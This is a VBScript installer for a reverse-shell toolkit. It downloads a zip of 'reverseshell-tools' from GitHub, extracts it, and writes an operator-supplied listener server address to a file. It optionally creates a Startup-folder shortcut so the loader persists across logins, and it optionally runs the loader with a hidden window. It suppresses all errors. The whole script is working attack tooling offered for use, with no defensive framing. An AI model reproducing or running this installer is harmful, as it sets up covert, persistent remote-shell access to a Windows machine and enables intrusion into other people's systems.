On Error Resume Next

Dim FSO, WShell, OShell

Set FSO = CreateObject("Scripting.FileSystemObject")
Set WShell = CreateObject("WScript.Shell")
Set OShell = CreateObject("Shell.Application")

Dim Path, Server, Run, AutoStart

Path = WScript.Arguments.Named("Path")
Server = WScript.Arguments.Named("Server")
AutoStart = WScript.Arguments.Named.Exists("AutoStart")
Run = WScript.Arguments.Named.Exists("Run")

If FSO.GetFileName(WScript.FullName) <> "cscript.exe" Then
    MsgBox("Run With cscript.exe !")
End If

If Path = "" Or Server = "" Then
    WScript.StdOut.Write("/Path and /Server must be specified!" & vbNewLine & vbNewLine)
    WScript.Quit(1)
End If

If Not FSO.FolderExists(Path) Then
    WScript.StdOut.Write("Invalid Path!")
End If

WScript.StdOut.Write("Downloading...")

Dim http, stream

Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
Set stream = CreateObject("ADODB.Stream")

http.Open "GET", "https://github.com/UltraAlex00/reverseshell-tools/archive/refs/heads/main.zip", False
http.Send
If http.Status = 200 Then
    stream.Open
    stream.Type = 1
    stream.Write(http.ResponseBody)
    stream.SaveToFile Path + "\download.zip", 2
    stream.Close

    WScript.StdOut.Write("OK" & vbNewLine & vbNewLine)
Else
    WScript.StdOut.Write("Error" & vbNewLine & vbNewLine)
    WScript.Quit
End If

WScript.StdOut.Write("Installing...")

Dim zip, extract

Set zip = OShell.NameSpace(Path + "\download.zip").Items
OShell.NameSpace(Path).CopyHere(zip) , 16

Dim listener

WShell.CurrentDirectory = Path + "\reverseshell-tools-main"
Set listener = FSO.CreateTextFile("listener.txt")
listener.Write(Server)

If AutoStart Then
    Dim shortcut

    Set shortcut = WShell.CreateShortcut(WShell.ExpandEnvironmentStrings("%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\loader.lnk"))
    shortcut.TargetPath = Path + "\reverseshell-tools-main\loader.vbs"
    shortcut.WorkingDirectory = Path + "\reverseshell-tools-main"
    shortcut.Save
End If

WScript.StdOut.Write("OK" & vbNewLine & vbNewLine)

If Run Then
    WScript.StdOut.Write("Starting RST...")
    WShell.Run("loader.vbs") , 0

    WScript.StdOut.Write("OK" & vbNewLine & vbNewLine)
End If